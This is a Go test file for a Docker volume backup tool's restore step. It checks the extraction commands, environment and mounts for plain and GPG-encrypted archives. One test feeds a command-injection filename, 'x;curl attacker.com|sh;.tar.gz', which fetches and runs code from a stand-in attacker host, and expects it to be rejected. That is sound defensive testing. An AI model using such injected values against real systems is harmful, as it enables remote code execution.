package restore_test

import (
	"testing"

	"github.com/bocklucas/dvb-made-easy/internal/docker"
	"github.com/bocklucas/dvb-made-easy/internal/restore"
)

func TestBuildExtractionConfigUnencrypted(t *testing.T) {
	cfg, err := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz", "dvb-restore-staging", "restore123", "target-volume", "")
	if err != nil {
		t.Fatalf("unexpected error: %s", err)
	}

	if cfg.Image != "alpine:latest" {
		t.Fatalf("image: got %q, want %q", cfg.Image, "alpine:latest")
	}

	if len(cfg.Cmd) != 3 {
		t.Fatalf("cmd len: got %d, want 3", len(cfg.Cmd))
	}
	if cfg.Cmd[0] != "sh" || cfg.Cmd[1] != "-c" {
		t.Fatalf("cmd prefix: got %v, want [sh -c ...]", cfg.Cmd[:2])
	}

	wantCmd := `tar -xzf "$BACKUP_FILE" -C /target --strip-components 2`
	if cfg.Cmd[2] != wantCmd {
		t.Fatalf("cmd:\ngot  %q\nwant %q", cfg.Cmd[2], wantCmd)
	}

	if len(cfg.Env) != 1 || cfg.Env[0] != "BACKUP_FILE=/staging/restore123/backup-2026-05-15T04-00-00.tar.gz" {
		t.Fatalf("env: got %v, want [BACKUP_FILE=...]", cfg.Env)
	}

	assertMounts(t, cfg.Mounts, "dvb-restore-staging", "target-volume")
}

func TestBuildExtractionConfigEncrypted(t *testing.T) {
	cfg, err := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz.gpg", "dvb-restore-staging", "restore456", "target-volume", "my-secret-pass")
	if err != nil {
		t.Fatalf("unexpected error: %s", err)
	}

	wantCmd := `apk add --no-cache gnupg && gpg --batch --passphrase "$GPG_PASSPHRASE" -d "$BACKUP_FILE" | tar -xz -C /target --strip-components 2`
	if cfg.Cmd[2] != wantCmd {
		t.Fatalf("cmd:\ngot  %q\nwant %q", cfg.Cmd[2], wantCmd)
	}

	if len(cfg.Env) != 2 {
		t.Fatalf("env len: got %d, want 2", len(cfg.Env))
	}
}

func TestBuildExtractionConfigUnsafeFilename(t *testing.T) {
	_, err := restore.BuildExtractionConfig("x;curl attacker.com|sh;.tar.gz", "dvb-restore-staging", "restore789", "target-volume", "")
	if err == nil {
		t.Fatal("expected error for unsafe filename, got nil")
	}
}

func assertMounts(t *testing.T, mounts []docker.Mount, expectStagingVolume, expectTargetVolume string) {
	t.Helper()
	if len(mounts) != 2 {
		t.Fatalf("mounts: got %d, want 2", len(mounts))
	}

	staging := mounts[0]
	if staging.Source != expectStagingVolume || staging.Target != "/staging" || !staging.ReadOnly {
		t.Fatalf("staging mount: got %+v", staging)
	}

	vol := mounts[1]
	if vol.Source != expectTargetVolume || vol.Target != "/target" || vol.ReadOnly {
		t.Fatalf("volume mount: got %+v", vol)
	}
}
